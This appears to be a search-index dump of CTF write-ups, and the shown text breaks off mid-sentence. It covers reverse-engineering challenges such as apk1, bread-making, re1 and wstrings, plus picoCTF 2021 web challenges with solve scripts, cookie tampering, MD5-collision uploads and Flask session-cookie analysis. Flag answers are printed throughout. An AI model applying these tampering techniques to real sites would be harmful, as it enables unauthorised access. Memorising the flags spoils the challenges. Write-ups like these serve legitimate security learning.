apk","title":"Description"},{"location":"Writeup/Reverse%20Engineering/apk1/#solution","text":"JEB\u6253\u5f00apk\uff0c\u53ef\u4ee5\u770b\u5230\u7a0b\u5e8f\u4e3b\u903b\u8f91\u7684\u5728native\u5c42\uff0c\u4f46\u662f\u8981\u6ce8\u610f\u7684\u662f\u8c03\u7528\u7684\u662fcheck\u51fd\u6570\u800c\u4e0d\u662fcheck1\u51fd\u6570 IDA\u6253\u5f00so\uff0c\u53ef\u4ee5\u53d1\u73b0\u7a0b\u5e8f\u76f4\u63a5\u6709check1\u51fd\u6570 \u800ccheck\u51fd\u6570\u662f\u901a\u8fc7JNI_Onload\u4e2dregisterNatives\u51fd\u6570\u6ce8\u518c\u7684\uff0c\u53ef\u4ee5\u901a\u8fc7\u53cd\u6c47\u7f16\u627e\u5230\u5173\u952e\u4f4d\u7f6e check\u51fd\u6570\u4e3b\u903b\u8f91\u5982\u4e0b\uff1a \u7a0d\u4f5c\u5206\u6790\uff0c\u53ef\u4ee5\u53d1\u73b0\u7a0b\u5e8f\u5bf9\u6211\u4eec\u7684\u8f93\u5165\u957f\u5ea6\u8fdb\u884c\u4e86\u5224\u65ad\u662f\u5426\u662f22\u4f4d\uff0c\u7136\u540e\u5bf9\u5176\u8fdb\u884c\u4e86hex\u8f6c\u5316\uff0c\u63a5\u7740rc4\u52a0\u5bc6\uff0c\u5bc6\u94a5\u662fflag\uff0c\u6700\u540e\u7528DES\u52a0\u5bc6\uff0c\u5bc6\u94a5\u8fd8\u662fflag\uff0c\u6700\u540e\u548c\u660e\u65870x99EDA1D941316EEA\u8fdb\u884c\u5bf9\u6bd4\u3002\u8981\u6ce8\u610f\u662f\u7684rc4\u751f\u6210\u65f6\u7528\u5230\u4e86crc\u6821\u9a8c\uff0c\u90a3\u4e48\u53ef\u4ee5\u7528\u52a8\u6001\u8c03\u8bd5\u53bb\u89e3\u5bc6rc4\u3002 #-*- coding:utf-8 from numpy import* from Crypto.Cipher import DES from Crypto.Cipher import ARC4 key='666C6167' des = DES.new(key, DES.MODE_ECB) cipher1='99EDA1D941316EEA'.decode('hex') plain1=des.decrypt(cipher1) print(plain1.encode('hex')) #\u6c42\u51fades\u89e3\u5bc6\u660e\u6587 \u52a8\u6001\u8c03\u8bd5\u89e3\u51farc4\u5bc6\u6587\uff0c\u5373\u4e3aflag","title":"Solution"},{"location":"Writeup/Reverse%20Engineering/apk1/#flag","text":"flag{76952041E276E2BF}","title":"Flag"},{"location":"Writeup/Reverse%20Engineering/apk1/#reference","text":"Writeup from https://mp.weixin.qq.com/s/0b9nQRxkbu7mDPji_Y8Ghw","title":"Reference"},{"location":"Writeup/Reverse%20Engineering/bread-making/","text":"bread-making Category: Reverse Engineering Source: redpwn CTF 2021 Author: KyleForkBomb Score: 10 Description My parents aren't home! Quick, help me make some bread please... nc mc.ax 31796 Downloads bread My Solution (I overthought this problem too much and spent around 3+ hours on this problem. Do not overthink problems, it's a bad habit of mine) The first thing I did was not put it into Ghidra, but open it in notepad++.(Which is definitely (no, not really) the best thing to do for reverse engineering problems) Somehow, I got lucky and saw text in the file. Dual-booting into Ubuntu, I downloaded the file and used Strings on the file. (Later on, I would use a Kali-Linux virtual machine which is much easier) The output of the strings'd file: first page second page third page So we have a bunch of text, what does it all mean? (I decided that it was probably some really hard problem, and I decided to use a reverse engineering program and my team told me to use Ghidra) (I looked at the file with Ghidra for around 3/4 of the time mentioned above, and it didn't help me) (I found the same text) So, I decided to backtrack and look at the text which I strings'd out. I decided to ignore everything that looked like something that helped the file run and wasn't something that seemed like a certain instruction or situation while making bread. I copied all of the instructions or situations. This is what I got: it's the next morning mom doesn't suspect a thing, but asks about some white dots on the bathroom floor couldn't open/read flag file, contact an admin if running on server mom finds flour in the sink and accuses you of making bread mom finds flour on the counter and accuses you of making bread mom finds burnt bread on the counter and accuses you of making bread mom finds the window opened and accuses you of making bread mom finds the fire alarm in the laundry room and accuses you of making bread the tray burns you and you drop the pan on the floor, waking up the entire house the flaming loaf sizzles in the sink the flaming loaf sets the kitchen on fire, setting off the fire alarm and waking up the entire house pull the tray out with a towel there's no time to waste pull the tray out the window is closed the fire alarm is replaced you sleep very well time to go to sleep close the window replace the fire alarm brush teeth and go to bed you've taken too long and fall asleep the dough has risen, but mom is still awake the dough has been forgotten, making an awful smell the next morning the dough has risen the bread needs to rise wait 2 hours wait 3 hours the oven makes too much noise, waking up the entire house the oven glows a soft red-orange the dough is done, and needs to be baked the dough wants to be baked preheat the oven preheat the toaster oven mom comes home and finds the bowl mom comes home and brings you food, then sees the bowl the ingredients are added and stirred into a lumpy dough mom comes home before you find a place to put the bowl the box is nice and warm leave the bowl on the counter put the bowl on the bookshelf hide the bowl inside a box the kitchen catches fire, setting off the fire alarm and waking up the entire house the bread has risen, touching the top of the oven and catching fire 45 minutes is an awfully long time you've moved around too much and mom wakes up, seeing you bake bread return upstairs watch the bread bake the sink is cleaned the counters are cleaned everything appears to be okay the kitchen is a mess wash the sink clean the counters get ready to sleep the half-baked bread is disposed of flush the bread down the toilet the oven shuts off cold air rushes in there's smoke in the air unplug the oven unplug the fire alarm open the window you put the fire alarm in another room one of the fire alarms in the house triggers, waking up the entire house brother is still awake, and sees you making bread you bring a bottle of oil and a tray it is time to finish the dough you've shuffled around too long, mom wakes up and sees you making bread work in the kitchen work in the basement flour has been added yeast has been added salt has been added water has been added add ingredients to the bowl add flour add yeast add salt add water we don't have that ingredient at home! the timer makes too much noise, waking up the entire house the bread is in the oven, and bakes for 45 minutes you've forgotten how long the bread bakes the timer ticks down use the oven timer set a timer on your phone So one thing I didn't do yet was running the code. I decided to run the code and the program outputted: add ingredients to the bowl Now, looking at the long list of instructions and situations, we can use logic to solve this problem. Also, the instructions to input are usually somewhere near the situations in the big block of text. First example: At the first prompt, we have to add ingredients. If we seach for the same statement in that big block of text, right below it, we can find: add flour add yeast add salt add water So we input that and we get the second prompt. However, there are some wrong inputs, so we have to trial and error with them until we get the right ones. There are also time limits, so make sure that you type in the inputs quick. Continue with that until we get to the end of the program where the flag is. You can use the netcat command or just run the file on your own system. (During this part, I forgot that the input and output lanes/streams are actually different. That means I could've just pasted all of the instructions into the terminal instead of typing all of it out, but I didn't do that) (There was one part which I had to tyep really fast for, and that would've been solved if I just pasted the whole input in. I already had all the inputs in a txt file, and I just forgot that I could paste the input into the terminal) So, by using some logic and searching, we get these instructions as the correct answers: add ingredients to the bowl add flour add yeast add salt add water hide the bowl inside a box wait 3 hours work in the basement preheat the toaster oven set a timer on your phone watch the bread bake pull the tray out with a towel unplug the fire alarm open the window unplug the oven clean the counters flush the bread down the toilet wash the sink get ready to sleep close the window replace the fire alarm brush teeth and go to bed By pasting all of those inputs, we get the flag. The flag is: flag{m4yb3_try_f0ccac1a_n3xt_t1m3???0r_dont_b4k3_br3ad_at_m1dnight} I think there might have been a way to decompile all of the code and just take all of the inputs without having to use logic and look at all of the inputs. If there is, feel free to open a new issue in this repository and tell me about it. That is, if there isn't already one. thanks for reading my writeup! Reference https://github.com/dudnamedcyan/Redpwn2021_Writeup/blob/main/rev/bread-making.md","title":"bread-making"},{"location":"Writeup/Reverse%20Engineering/bread-making/#bread-making","text":"Category: Reverse Engineering Source: redpwn CTF 2021 Author: KyleForkBomb Score: 10","title":"bread-making"},{"location":"Writeup/Reverse%20Engineering/bread-making/#description","text":"My parents aren't home! Quick, help me make some bread please... nc mc.ax 31796","title":"Description"},{"location":"Writeup/Reverse%20Engineering/bread-making/#downloads","text":"bread","title":"Downloads"},{"location":"Writeup/Reverse%20Engineering/bread-making/#my-solution","text":"(I overthought this problem too much and spent around 3+ hours on this problem. Do not overthink problems, it's a bad habit of mine) The first thing I did was not put it into Ghidra, but open it in notepad++.(Which is definitely (no, not really) the best thing to do for reverse engineering problems) Somehow, I got lucky and saw text in the file. Dual-booting into Ubuntu, I downloaded the file and used Strings on the file. (Later on, I would use a Kali-Linux virtual machine which is much easier) The output of the strings'd file:","title":"My Solution"},{"location":"Writeup/Reverse%20Engineering/bread-making/#first-page","text":"","title":"first page"},{"location":"Writeup/Reverse%20Engineering/bread-making/#second-page","text":"","title":"second page"},{"location":"Writeup/Reverse%20Engineering/bread-making/#third-page","text":"So we have a bunch of text, what does it all mean? (I decided that it was probably some really hard problem, and I decided to use a reverse engineering program and my team told me to use Ghidra) (I looked at the file with Ghidra for around 3/4 of the time mentioned above, and it didn't help me) (I found the same text) So, I decided to backtrack and look at the text which I strings'd out. I decided to ignore everything that looked like something that helped the file run and wasn't something that seemed like a certain instruction or situation while making bread. I copied all of the instructions or situations. This is what I got: it's the next morning mom doesn't suspect a thing, but asks about some white dots on the bathroom floor couldn't open/read flag file, contact an admin if running on server mom finds flour in the sink and accuses you of making bread mom finds flour on the counter and accuses you of making bread mom finds burnt bread on the counter and accuses you of making bread mom finds the window opened and accuses you of making bread mom finds the fire alarm in the laundry room and accuses you of making bread the tray burns you and you drop the pan on the floor, waking up the entire house the flaming loaf sizzles in the sink the flaming loaf sets the kitchen on fire, setting off the fire alarm and waking up the entire house pull the tray out with a towel there's no time to waste pull the tray out the window is closed the fire alarm is replaced you sleep very well time to go to sleep close the window replace the fire alarm brush teeth and go to bed you've taken too long and fall asleep the dough has risen, but mom is still awake the dough has been forgotten, making an awful smell the next morning the dough has risen the bread needs to rise wait 2 hours wait 3 hours the oven makes too much noise, waking up the entire house the oven glows a soft red-orange the dough is done, and needs to be baked the dough wants to be baked preheat the oven preheat the toaster oven mom comes home and finds the bowl mom comes home and brings you food, then sees the bowl the ingredients are added and stirred into a lumpy dough mom comes home before you find a place to put the bowl the box is nice and warm leave the bowl on the counter put the bowl on the bookshelf hide the bowl inside a box the kitchen catches fire, setting off the fire alarm and waking up the entire house the bread has risen, touching the top of the oven and catching fire 45 minutes is an awfully long time you've moved around too much and mom wakes up, seeing you bake bread return upstairs watch the bread bake the sink is cleaned the counters are cleaned everything appears to be okay the kitchen is a mess wash the sink clean the counters get ready to sleep the half-baked bread is disposed of flush the bread down the toilet the oven shuts off cold air rushes in there's smoke in the air unplug the oven unplug the fire alarm open the window you put the fire alarm in another room one of the fire alarms in the house triggers, waking up the entire house brother is still awake, and sees you making bread you bring a bottle of oil and a tray it is time to finish the dough you've shuffled around too long, mom wakes up and sees you making bread work in the kitchen work in the basement flour has been added yeast has been added salt has been added water has been added add ingredients to the bowl add flour add yeast add salt add water we don't have that ingredient at home! the timer makes too much noise, waking up the entire house the bread is in the oven, and bakes for 45 minutes you've forgotten how long the bread bakes the timer ticks down use the oven timer set a timer on your phone So one thing I didn't do yet was running the code. I decided to run the code and the program outputted: add ingredients to the bowl Now, looking at the long list of instructions and situations, we can use logic to solve this problem. Also, the instructions to input are usually somewhere near the situations in the big block of text. First example: At the first prompt, we have to add ingredients. If we seach for the same statement in that big block of text, right below it, we can find: add flour add yeast add salt add water So we input that and we get the second prompt. However, there are some wrong inputs, so we have to trial and error with them until we get the right ones. There are also time limits, so make sure that you type in the inputs quick. Continue with that until we get to the end of the program where the flag is. You can use the netcat command or just run the file on your own system. (During this part, I forgot that the input and output lanes/streams are actually different. That means I could've just pasted all of the instructions into the terminal instead of typing all of it out, but I didn't do that) (There was one part which I had to tyep really fast for, and that would've been solved if I just pasted the whole input in. I already had all the inputs in a txt file, and I just forgot that I could paste the input into the terminal) So, by using some logic and searching, we get these instructions as the correct answers: add ingredients to the bowl add flour add yeast add salt add water hide the bowl inside a box wait 3 hours work in the basement preheat the toaster oven set a timer on your phone watch the bread bake pull the tray out with a towel unplug the fire alarm open the window unplug the oven clean the counters flush the bread down the toilet wash the sink get ready to sleep close the window replace the fire alarm brush teeth and go to bed By pasting all of those inputs, we get the flag. The flag is: flag{m4yb3_try_f0ccac1a_n3xt_t1m3???0r_dont_b4k3_br3ad_at_m1dnight} I think there might have been a way to decompile all of the code and just take all of the inputs without having to use logic and look at all of the inputs. If there is, feel free to open a new issue in this repository and tell me about it. That is, if there isn't already one. thanks for reading my writeup!","title":"third page"},{"location":"Writeup/Reverse%20Engineering/bread-making/#reference","text":"https://github.com/dudnamedcyan/Redpwn2021_Writeup/blob/main/rev/bread-making.md","title":"Reference"},{"location":"Writeup/Reverse%20Engineering/dimensionality/","text":"dimensionality Category: Reverse Engineering Source: redpwn CTF 2021 Author: EvilMuffinHa, asphyxia Score: 15 Description The more the merrier Downloads chall Overview Opened it in Ghidra but the decompilation sucked, so I switched to Cutter. Basically the program calls a function to check the input. If it passes, it XOR's the input with a byte-string to print the flag. It's hard to tell what the input checker does just by looking, so this is where using Cutter's debugger to setup through the program in graph view helped a lot. Another thing that helped was running the program in Qiling and hooking several important addresses to dump the registers. See debug.py for script In short, we have this thing: Start at 2 and end at 3 Can only step on the 1's Can only step forwards/backwards in increments of 1, 11, and 121 Each character determines what kind of step to take Input must be at most 29 characters I solved this with breadth-first search (see solve.py ), which gave me 5 possible strings: flluulluuffffrrffrrddddrrfff fllddllffrrffffrrffuubbrrfff fddllllffrrffffrrffuubbrrfff frrffllllffddffrrffuubbrrfff frrffllffllddffrrffuubbrrfff frrffllffddllffrrffuubbrrfff It was the last one: $ ./chall frrffllffddllffrrffuubbrrfff :) flag{star_/_so_bright_/_car_/_site_-ppsu} Reference Writeup from https://github.com/cscosu/ctf-writeups/tree/master/2021/redpwn_ctf/dimensionality","title":"dimensionality"},{"location":"Writeup/Reverse%20Engineering/dimensionality/#dimensionality","text":"Category: Reverse Engineering Source: redpwn CTF 2021 Author: EvilMuffinHa, asphyxia Score: 15","title":"dimensionality"},{"location":"Writeup/Reverse%20Engineering/dimensionality/#description","text":"The more the merrier","title":"Description"},{"location":"Writeup/Reverse%20Engineering/dimensionality/#downloads","text":"chall","title":"Downloads"},{"location":"Writeup/Reverse%20Engineering/dimensionality/#overview","text":"Opened it in Ghidra but the decompilation sucked, so I switched to Cutter. Basically the program calls a function to check the input. If it passes, it XOR's the input with a byte-string to print the flag. It's hard to tell what the input checker does just by looking, so this is where using Cutter's debugger to setup through the program in graph view helped a lot. Another thing that helped was running the program in Qiling and hooking several important addresses to dump the registers. See debug.py for script In short, we have this thing: Start at 2 and end at 3 Can only step on the 1's Can only step forwards/backwards in increments of 1, 11, and 121 Each character determines what kind of step to take Input must be at most 29 characters I solved this with breadth-first search (see solve.py ), which gave me 5 possible strings: flluulluuffffrrffrrddddrrfff fllddllffrrffffrrffuubbrrfff fddllllffrrffffrrffuubbrrfff frrffllllffddffrrffuubbrrfff frrffllffllddffrrffuubbrrfff frrffllffddllffrrffuubbrrfff It was the last one: $ ./chall frrffllffddllffrrffuubbrrfff :) flag{star_/_so_bright_/_car_/_site_-ppsu}","title":"Overview"},{"location":"Writeup/Reverse%20Engineering/dimensionality/#reference","text":"Writeup from https://github.com/cscosu/ctf-writeups/tree/master/2021/redpwn_ctf/dimensionality","title":"Reference"},{"location":"Writeup/Reverse%20Engineering/re1/","text":"re1 Category: Reverse Engineering Source: \u7965\u4e91\u676f2020 Author: unknown Score: 15 Description The program that can never be reversed\uff1f Solution \u8f93\u5165\u7684\u5b57\u7b26\u4e32\uff0c\u6839\u636e\u6bcf\u4f4d\u7684\u5b57\u7b26\u4f1a\u7ecf\u8fc7\u4e00\u5806\u7684\u5904\u7406\uff0c\u7136\u540e\u8ddf\u76f8\u5e94\u7684\u6570\u636e\u4e00\u4f4d\u4e00\u4f4d\u5bf9\u6bd4\u3002\u53ef\u4ee5\u76f4\u63a5\u8f93\u51650-9 a-z\u7684\u5b57\u7b26\u4e32\u6765\u8fdb\u884c\u7206\u7834\u4e00\u4e0b\u5b57\u7b26\u5bf9\u5e94\uff0c\u4ece\u800c\u5f97\u5230flag\u3002 # 1234567890abcdefghijklmnopqrstuv # unsigned char ida_chars[] = # { # 0xE9, 0xEA, 0xEB, 0xEC, 0xED, 1-5 # 0xEE, 0xEF, 0xF0, 0xF1, 0xE8, 6-0 # 0x19, 0x1A, 0x1B, 0x1C, 0x1D, a-e # 0x1E, 0x1F, 0x20, 0x21, 0x22, f-j # 0x23, 0x24, 0x25, 0x26, 0x27, k-o # 0x28, 0x29, 0x2A, 0x2B, 0x2C, p-t # 0x2D, 0x2E u-v # }; # cmpcode = 0xeb 0xf1 0x19 0xe8 0x1e 0x1e 0xf0 0xec 0xef 0x1e # 0xe9 0x1e 0xec 0xec 0xe8 0xec 0x19 0x19 0xee 0x1b # 0xef 0xef 0xec 0xea 0x1c 0xea 0xe8 0xeb 0xee 0xeb 0x1d 0xf1 key = [0xeb,0xf1,0x19,0xe8,0x1e,0x1e,0xf0,0xec,0xef,0x1e, 0xe9,0x1e,0xec,0xec,0xe8,0xec,0x19,0x19,0xee,0x1b, 0xef,0xef,0xec,0xea,0x1c,0xea,0xe8,0xeb,0xee,0xeb,0x1d,0xf1 ] flag = 'flag{' for i in range(len(key)): if 0xe8<=key[i]<=0xf1: flag += chr(key[i] - 184) if 0x19<=key[i]<=(0x19+26): flag += chr(key[i] + 72) print(flag+'}') Flag flag{39a0ff847f1f4404aa6c7742d20363e9} Reference Writeup from https://mp.weixin.qq.com/s/0b9nQRxkbu7mDPji_Y8Ghw","title":"re1"},{"location":"Writeup/Reverse%20Engineering/re1/#re1","text":"Category: Reverse Engineering Source: \u7965\u4e91\u676f2020 Author: unknown Score: 15","title":"re1"},{"location":"Writeup/Reverse%20Engineering/re1/#description","text":"The program that can never be reversed\uff1f","title":"Description"},{"location":"Writeup/Reverse%20Engineering/re1/#solution","text":"\u8f93\u5165\u7684\u5b57\u7b26\u4e32\uff0c\u6839\u636e\u6bcf\u4f4d\u7684\u5b57\u7b26\u4f1a\u7ecf\u8fc7\u4e00\u5806\u7684\u5904\u7406\uff0c\u7136\u540e\u8ddf\u76f8\u5e94\u7684\u6570\u636e\u4e00\u4f4d\u4e00\u4f4d\u5bf9\u6bd4\u3002\u53ef\u4ee5\u76f4\u63a5\u8f93\u51650-9 a-z\u7684\u5b57\u7b26\u4e32\u6765\u8fdb\u884c\u7206\u7834\u4e00\u4e0b\u5b57\u7b26\u5bf9\u5e94\uff0c\u4ece\u800c\u5f97\u5230flag\u3002 # 1234567890abcdefghijklmnopqrstuv # unsigned char ida_chars[] = # { # 0xE9, 0xEA, 0xEB, 0xEC, 0xED, 1-5 # 0xEE, 0xEF, 0xF0, 0xF1, 0xE8, 6-0 # 0x19, 0x1A, 0x1B, 0x1C, 0x1D, a-e # 0x1E, 0x1F, 0x20, 0x21, 0x22, f-j # 0x23, 0x24, 0x25, 0x26, 0x27, k-o # 0x28, 0x29, 0x2A, 0x2B, 0x2C, p-t # 0x2D, 0x2E u-v # }; # cmpcode = 0xeb 0xf1 0x19 0xe8 0x1e 0x1e 0xf0 0xec 0xef 0x1e # 0xe9 0x1e 0xec 0xec 0xe8 0xec 0x19 0x19 0xee 0x1b # 0xef 0xef 0xec 0xea 0x1c 0xea 0xe8 0xeb 0xee 0xeb 0x1d 0xf1 key = [0xeb,0xf1,0x19,0xe8,0x1e,0x1e,0xf0,0xec,0xef,0x1e, 0xe9,0x1e,0xec,0xec,0xe8,0xec,0x19,0x19,0xee,0x1b, 0xef,0xef,0xec,0xea,0x1c,0xea,0xe8,0xeb,0xee,0xeb,0x1d,0xf1 ] flag = 'flag{' for i in range(len(key)): if 0xe8<=key[i]<=0xf1: flag += chr(key[i] - 184) if 0x19<=key[i]<=(0x19+26): flag += chr(key[i] + 72) print(flag+'}')","title":"Solution"},{"location":"Writeup/Reverse%20Engineering/re1/#flag","text":"flag{39a0ff847f1f4404aa6c7742d20363e9}","title":"Flag"},{"location":"Writeup/Reverse%20Engineering/re1/#reference","text":"Writeup from https://mp.weixin.qq.com/s/0b9nQRxkbu7mDPji_Y8Ghw","title":"Reference"},{"location":"Writeup/Reverse%20Engineering/speeds%20and%20feeds/","text":"speeds and feeds Category: Reverse Engineering Source: picoCTF 2021 Author: RYAN RAMSEYER Score: 5 Description There is something on my shop network running at nc mercury.picoctf.net 20301 , but I can't tell what it is. Can you? Hints What language does a CNC machine use? Approach Connecting to mercury.picoctf.net:53740 (through web) results in instructions.gcode A quick Google search says a CNC machine uses GCode which can have a file extension of .gcode so I pasted that section of code into a text editor and saved it as a .gcode file. NC Viewer can view GCode files: Flag picoCTF{num3r1cal_c0ntr0l_775375c7} Reference Writeup from https://github.com/vivian-dai/PicoCTF2021-Writeup/blob/main/Reverse%20Engineering/speeds%20and%20feeds/speeds%20and%20feeds.md","title":"speeds and feeds"},{"location":"Writeup/Reverse%20Engineering/speeds%20and%20feeds/#speeds-and-feeds","text":"Category: Reverse Engineering Source: picoCTF 2021 Author: RYAN RAMSEYER Score: 5","title":"speeds and feeds"},{"location":"Writeup/Reverse%20Engineering/speeds%20and%20feeds/#description","text":"There is something on my shop network running at nc mercury.picoctf.net 20301 , but I can't tell what it is. Can you?","title":"Description"},{"location":"Writeup/Reverse%20Engineering/speeds%20and%20feeds/#hints","text":"What language does a CNC machine use?","title":"Hints"},{"location":"Writeup/Reverse%20Engineering/speeds%20and%20feeds/#approach","text":"Connecting to mercury.picoctf.net:53740 (through web) results in instructions.gcode A quick Google search says a CNC machine uses GCode which can have a file extension of .gcode so I pasted that section of code into a text editor and saved it as a .gcode file. NC Viewer can view GCode files:","title":"Approach"},{"location":"Writeup/Reverse%20Engineering/speeds%20and%20feeds/#flag","text":"picoCTF{num3r1cal_c0ntr0l_775375c7}","title":"Flag"},{"location":"Writeup/Reverse%20Engineering/speeds%20and%20feeds/#reference","text":"Writeup from https://github.com/vivian-dai/PicoCTF2021-Writeup/blob/main/Reverse%20Engineering/speeds%20and%20feeds/speeds%20and%20feeds.md","title":"Reference"},{"location":"Writeup/Reverse%20Engineering/wstrings/","text":"wstrings Category: Reverse Engineering Source: redpwn CTF 2021 Author: NotDeGhost Score: 5 Description Some strings are wider than normal... Author : NotDeGhost wstrings Detailed solution As the description mention let's start by checking file strings At offest 0x930 we can see our flag ~# hexdump -n 140 -s 0x930 -C wstrings 00000930 01 00 02 00 00 00 00 00 66 00 00 00 6c 00 00 00 |........f...l...| 00000940 61 00 00 00 67 00 00 00 7b 00 00 00 6e 00 00 00 |a...g...{...n...| 00000950 30 00 00 00 74 00 00 00 5f 00 00 00 61 00 00 00 |0...t..._...a...| 00000960 6c 00 00 00 31 00 00 00 5f 00 00 00 73 00 00 00 |l...1..._...s...| 00000970 74 00 00 00 72 00 00 00 31 00 00 00 6e 00 00 00 |t...r...1...n...| 00000980 67 00 00 00 73 00 00 00 5f 00 00 00 61 00 00 00 |g...s..._...a...| 00000990 72 00 00 00 33 00 00 00 5f 00 00 00 73 00 00 00 |r...3..._...s...| 000009a0 6b 00 00 00 31 00 00 00 6e 00 00 00 6e 00 00 00 |k...1...n...n...| 000009b0 79 00 00 00 7d 00 00 00 00 00 00 00 |y...}.......| 000009bc Flag flag{n0t_al1_str1ngs_ar3_sk1nny} Reference Writeup from https://github.com/BaadMaro/CTF/tree/main/redpwnCTF%202021/REV%20-%20wstrings","title":"wstrings"},{"location":"Writeup/Reverse%20Engineering/wstrings/#wstrings","text":"Category: Reverse Engineering Source: redpwn CTF 2021 Author: NotDeGhost Score: 5","title":"wstrings"},{"location":"Writeup/Reverse%20Engineering/wstrings/#description","text":"Some strings are wider than normal... Author : NotDeGhost wstrings","title":"Description"},{"location":"Writeup/Reverse%20Engineering/wstrings/#detailed-solution","text":"As the description mention let's start by checking file strings At offest 0x930 we can see our flag ~# hexdump -n 140 -s 0x930 -C wstrings 00000930 01 00 02 00 00 00 00 00 66 00 00 00 6c 00 00 00 |........f...l...| 00000940 61 00 00 00 67 00 00 00 7b 00 00 00 6e 00 00 00 |a...g...{...n...| 00000950 30 00 00 00 74 00 00 00 5f 00 00 00 61 00 00 00 |0...t..._...a...| 00000960 6c 00 00 00 31 00 00 00 5f 00 00 00 73 00 00 00 |l...1..._...s...| 00000970 74 00 00 00 72 00 00 00 31 00 00 00 6e 00 00 00 |t...r...1...n...| 00000980 67 00 00 00 73 00 00 00 5f 00 00 00 61 00 00 00 |g...s..._...a...| 00000990 72 00 00 00 33 00 00 00 5f 00 00 00 73 00 00 00 |r...3..._...s...| 000009a0 6b 00 00 00 31 00 00 00 6e 00 00 00 6e 00 00 00 |k...1...n...n...| 000009b0 79 00 00 00 7d 00 00 00 00 00 00 00 |y...}.......| 000009bc","title":"Detailed solution"},{"location":"Writeup/Reverse%20Engineering/wstrings/#flag","text":"flag{n0t_al1_str1ngs_ar3_sk1nny}","title":"Flag"},{"location":"Writeup/Reverse%20Engineering/wstrings/#reference","text":"Writeup from https://github.com/BaadMaro/CTF/tree/main/redpwnCTF%202021/REV%20-%20wstrings","title":"Reference"},{"location":"Writeup/Web%20Exploitation/Cookies/","text":"Cookies Category: Web Exploitation Source: picoCTF 2021 Author: MADSTACKS Score: 10 Description Who doesn't love cookies? Try to figure out the best one. http://mercury.picoctf.net:54219/ Hints (None) Approach The link goes to something that looks like this: I typed in \"snickerdoodle\" and entered it. I love snickerdoodle cookies! Ctrl + Shift + I will reveal some things, navigate to storage, then find cookies storage. I noticed there's a grand total of one cookie with a value of 0. I changed the value to 1 and refreshed the page. I love chocolate chip cookies! I kept increasing the numeric value of value by 1 until at 18, it gave the flag: Flag picoCTF{3v3ry1_l0v3s_c00k135_bb3b3535} Reference Writeup from https://github.com/vivian-dai/PicoCTF2021-Writeup/blob/main/Web%20Exploitation/Cookies/Cookies.md","title":"Cookies"},{"location":"Writeup/Web%20Exploitation/Cookies/#cookies","text":"Category: Web Exploitation Source: picoCTF 2021 Author: MADSTACKS Score: 10","title":"Cookies"},{"location":"Writeup/Web%20Exploitation/Cookies/#description","text":"Who doesn't love cookies? Try to figure out the best one. http://mercury.picoctf.net:54219/","title":"Description"},{"location":"Writeup/Web%20Exploitation/Cookies/#hints","text":"(None)","title":"Hints"},{"location":"Writeup/Web%20Exploitation/Cookies/#approach","text":"The link goes to something that looks like this: I typed in \"snickerdoodle\" and entered it. I love snickerdoodle cookies! Ctrl + Shift + I will reveal some things, navigate to storage, then find cookies storage. I noticed there's a grand total of one cookie with a value of 0. I changed the value to 1 and refreshed the page. I love chocolate chip cookies! I kept increasing the numeric value of value by 1 until at 18, it gave the flag:","title":"Approach"},{"location":"Writeup/Web%20Exploitation/Cookies/#flag","text":"picoCTF{3v3ry1_l0v3s_c00k135_bb3b3535}","title":"Flag"},{"location":"Writeup/Web%20Exploitation/Cookies/#reference","text":"Writeup from https://github.com/vivian-dai/PicoCTF2021-Writeup/blob/main/Web%20Exploitation/Cookies/Cookies.md","title":"Reference"},{"location":"Writeup/Web%20Exploitation/It%20is%20my%20Birthday/","text":"It is my Birthday Category: Web Exploitation Source: picoCTF 2021 Author: MADSTACKS Score: 10 Description I sent out 2 invitations to all of my friends for my birthday! I'll know if they get stolen because the two invites look similar, and they even have the same md5 hash, but they are slightly different! You wouldn't believe how long it took me to find a collision. Anyway, see if you're invited by submitting 2 PDFs to my website. http://mercury.picoctf.net:63578/ Hints Look at the category of this problem. How may a PHP site check the rules in the description? Approach I searched up \"MD5 collision\" and eventually found this website. It provided 2 executable files ( hello and erase ) which have the same MD5 hash. I downloaded those files and changed the extension to a .pdf file. I uploaded those two files and the website redirected to the PHP : The flag can be found in a comment at the end of the PHP (before the HTML portion, line 37 ) Flag picoCTF{c0ngr4ts_u_r_1nv1t3d_3d3e4c57} Reference Writeup from https://github.com/vivian-dai/PicoCTF2021-Writeup/blob/main/Web%20Exploitation/It%20is%20my%20Birthday/It%20is%20my%20Birthday.md","title":"It is my Birthday"},{"location":"Writeup/Web%20Exploitation/It%20is%20my%20Birthday/#it-is-my-birthday","text":"Category: Web Exploitation Source: picoCTF 2021 Author: MADSTACKS Score: 10","title":"It is my Birthday"},{"location":"Writeup/Web%20Exploitation/It%20is%20my%20Birthday/#description","text":"I sent out 2 invitations to all of my friends for my birthday! I'll know if they get stolen because the two invites look similar, and they even have the same md5 hash, but they are slightly different! You wouldn't believe how long it took me to find a collision. Anyway, see if you're invited by submitting 2 PDFs to my website. http://mercury.picoctf.net:63578/","title":"Description"},{"location":"Writeup/Web%20Exploitation/It%20is%20my%20Birthday/#hints","text":"Look at the category of this problem. How may a PHP site check the rules in the description?","title":"Hints"},{"location":"Writeup/Web%20Exploitation/It%20is%20my%20Birthday/#approach","text":"I searched up \"MD5 collision\" and eventually found this website. It provided 2 executable files ( hello and erase ) which have the same MD5 hash. I downloaded those files and changed the extension to a .pdf file. I uploaded those two files and the website redirected to the PHP : The flag can be found in a comment at the end of the PHP (before the HTML portion, line 37 )","title":"Approach"},{"location":"Writeup/Web%20Exploitation/It%20is%20my%20Birthday/#flag","text":"picoCTF{c0ngr4ts_u_r_1nv1t3d_3d3e4c57}","title":"Flag"},{"location":"Writeup/Web%20Exploitation/It%20is%20my%20Birthday/#reference","text":"Writeup from https://github.com/vivian-dai/PicoCTF2021-Writeup/blob/main/Web%20Exploitation/It%20is%20my%20Birthday/It%20is%20my%20Birthday.md","title":"Reference"},{"location":"Writeup/Web%20Exploitation/Most%20Cookies/","text":"Most Cookies Category: Web Exploitation Source: picoCTF 2021 Author: MADSTACKS Score: 15 Description Alright, enough of using my own encryption. Flask session cookies should be plenty secure! server.py http://mercury.picoctf.net:44693/ Hints How secure is a flask cookie? Approach I analyzed the server.py reference code. The highlighted code below has great importance. def flag(): if session.get(\"very_auth\"): check = session[\"very_auth\"] if check == \"admin\": resp = make_response(render_template(\"flag.html\", value=flag_value, title=title)) return resp flash(\"That is a cookie! Not very special though...\", \"success\") return render_template(\"not-flag.html\", title=title, cookie_name=session[\"very_auth\"]) else: resp = make_response(redirect(\"/\")) session[\"very_auth\"] = \"blank\" return resp I found that if you entered a cookie name given in the cookie name list (view line 7 in the server.py code), you will go into the first if statement but completely miss the nested if: if check == \"admin\": From this, it is clear we 